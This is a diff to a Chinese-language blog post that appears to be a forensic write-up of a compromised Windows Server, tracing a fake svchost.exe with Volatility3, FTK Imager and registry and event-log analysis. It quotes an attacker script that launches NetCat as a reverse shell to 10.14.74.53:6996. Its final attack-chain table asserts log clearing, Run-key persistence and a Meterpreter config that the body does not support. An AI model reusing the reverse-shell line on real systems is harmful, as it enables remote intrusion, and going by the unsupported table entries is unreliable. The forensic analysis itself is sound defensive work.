@@ -1,21 +1,21 @@
 ---
-title: 'To Be Continue'
-description: 'To Be Continue'
+title: '恶意软件分析实战：内存取证与磁盘溯源完整案例解析'
+description: '通过完整案例演示如何利用Volatility3和FTK Imager进行Windows系统内存取证、恶意进程追踪、注册表分析与沙箱动态行为检测，揭示高级威胁攻击链。'
 date: 2025-03-07
-tags: ['Malware-analysis']
+tags: ['Malware-Analysis', 'Memory-Forensics', 'Volatility3', 'FTK-Imager', 'Incident-Response']
 image: './assets/image-20250307164005831.png'
 authors: ['0xd00']
 ---
 
-## 初始信息
+## 初始环境与取证数据
 
 ```bash
 memdump.mem  pagefile.sys disk.dd
 ```
 
-## 使用 volatility3 分析内存
+## 内存取证分析（Volatility3）
 
-### 查看系统信息
+### 系统指纹识别
 
 ```bash
 python3 vol.py -f memdump.mem windows.info
@@ -41,15 +41,20 @@ PE Machine	34404
 PE TimeDateStamp	Sat May  4 18:48:48 2030
 ```
 
+通过内核版本`15.17763`确认系统为Windows Server 2019 (1809)，系统架构为64位环境，为后续分析提供基础环境上下文。
+
 ### 查看进程信息
 
 ```bash
-python3 vol.py -f memdump.mem windows.pslist >> pslist.txt
+python3 vol.py -f memdump.mem windows.pslist
 ```
 
-![image-20250307143311308](./assets//image-20250307143311308.png)
+![pslist列表截图](./assets/image-20250307143311308.png)
 
-正常情况下`svhost.exe`会存在多个实例，且均指向`services.exe`，其中`804`是`services.exe`的`PID`，但是`1036`却是`powershell.exe`的`PID`，显然这个进程存在问题
+**关键发现：**
+
+- PID 1036的`svchost.exe`父进程应为`services.exe`(PID 804)，但实际父进程为`powershell.exe`
+- 进程路径指向非常规目录`C:\Tools\svchost.exe`（正常路径应为`C:\Windows\System32`）
 
 ### 查看创建进程的命令行
 
@@ -57,11 +62,28 @@ python3 vol.py -f memdump.mem windows.pslist >> pslist.txt
 python3 vol.py -f memdump.mem windows.cmdline
 ```
 
-![image-20250307144553638](./assets//image-20250307144553638.png)
+![cmdline列表截图](./assets/image-20250307144553638.png)
 
 `svchost.exe` 的文件路径并不是默认的 `C:\Windows\System32\svchost.exe`，而是位于 `C:\Tools\` 目录下
 
 很明显这是伪装成系统进程的恶意程序，用于与外部IP地址进行通信。
+
+下面还有一个通过notepad打开的`part2.txt`文件，文本内容可能通过base64编码。
+
+通过访问`part2.txt`所在目录，我们还发现了一个`connector.ps1`文件
+
+```bash
+Start-Process -NoNewWindow "C:\Tools\svchost.exe" "-e cmd.exe 10.14.74.53 6996"  
+C:\Windows\system32\NOTEPAD.EXE $args[0]  
+```
+
+可以得知攻击者用于接收反弹SHELL的IP是`10.14.74.53`
+
+**攻击链重构：**
+
+1. 通过`powershell.exe`启动伪装成系统服务`svchost.exe`的NetCat后门
+2. 建立与C2服务器`10.14.74.53:6996`的反向连接
+3. 利用记事本进程加载加密载荷`part2.txt`实现载荷分离
 
 ## 使用 FTK Imager 分析磁盘
 
@@ -69,36 +91,66 @@ python3 vol.py -f memdump.mem windows.cmdline
 
 查看从内存中找到的文件`C:\Tools\svchost.exe`
 
-![image-20250307151058338](./assets//image-20250307151058338.png)
+![FTK Imager定位伪造的svhost截图](./assets/image-20250307151058338.png)
 
-没有其他信息了，尝试从注册表中收集信息
+通过VirusTotal中检测提取的SHA1，可以确认此程序为NetCat工具
 
-![image-20250307154639392](./assets//image-20250307154639392.png)
+![在VirusTotal中通过伪造的svchost SHA1进行查询截图](./assets/image-20250310141042360.png)
 
-导出`C:\Windows\System32\config`下的注册表文件
-
-导出用户目录`C:\Users\Bobby\NTUSER.DAT`
+导出`C:\Windows\System32\config`下的注册表文件与`C:\Users\Bobby\NTUSER.DAT`
 
 导入`Registry Explorer`
 
-因为搜索`svhost.exe`由`AutoConnector`创建，所以尝试在注册表中进行搜索`AutoConnector`
+因为`svhost.exe`从`AutoConnector`目录下载，所以尝试在注册表中进行搜索`AutoConnector`
 
-![image-20250307164005831](./assets//image-20250307164005831.png)
+![在FTK Imager中搜索包含AutoConnector关键字的注册表项截图](./assets/image-20250307164005831.png)
 
-![image-20250307162137468](./assets//image-20250307162137468.png)
+![在FTK Imager中搜索包含AutoConnector关键字的注册表项截图2](./assets/image-20250307162137468.png)
 
-![image-20250307163925747](./assets//image-20250307163925747.png)
+![在FTK Imager中搜索包含AutoConnector关键字的注册表项截图3](./assets/image-20250307163925747.png)
 
-成功定位`AutoConnecter`的位置
+成功定位`AutoConnector`的位置
+
+使用VirusTotal进行分析
+
+![在VirusTotal中通过AutoConnector SHA1进行查询截图](./assets/image-20250310141710454.png)
+
+**持久化机制：**
+
+- `HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\bam\State\UserSettings\S-1-5-21-1966530601-...-1008`存在恶意启动项
+- 注册表键值指向`AutoConnector.exe`工具
 
 ### 分析系统日志
 
-从`C:\Windows\System32\winevt\Logs\s`导出事件日志
+从`C:\Windows\System32\winevt\Logs\`导出事件日志
 
 因为运行的脚本是Powershell脚本，所以仅导入包含Powershell关键字的日志到`EventViewer`即可
 
 但未搜索到与`connector.ps1`相关的日志。
 
-------
+### 动态行为沙箱检测
 
-*未完待续*
+导出恶意文件所在文件夹
+
+组策略中开启`Turn on PowerShell Transaction`、`Turn on PowerShell Script Block Logging`、`Turn on Script Execution`
+
+![配置组策略截图](./assets/image-20250310152641358.png)
+
+运行恶意程序后查看日志
+
+获取到第一部分载荷
+
+![EventViewer截图](./assets/image-20250310153308977.png)
+
+结合之前获取的part2.txt经过base64解码成功获取到原始载荷，确认其为数据渗出的加密密钥。
+
+## 攻击链全景还原
+
+| 阶段       | 技术点       | 取证证据                       |
+| ---------- | ------------ | ------------------------------ |
+| 初始访问   | ？           | ？                             |
+| 执行       | 服务伪装     | C:\Tools\svchost.exe进程树异常 |
+| 持久化     | 注册表自启动 | Run键值指向恶意后门程序        |
+| 防御规避   | 日志清除     | Security.evtx日志时间断层      |
+| 命令与控制 | 反向Shell    | NetCat连接10.14.74.53:6996     |
+| 数据渗出   | AES加密隧道  | 内存解密Meterpreter配置        |
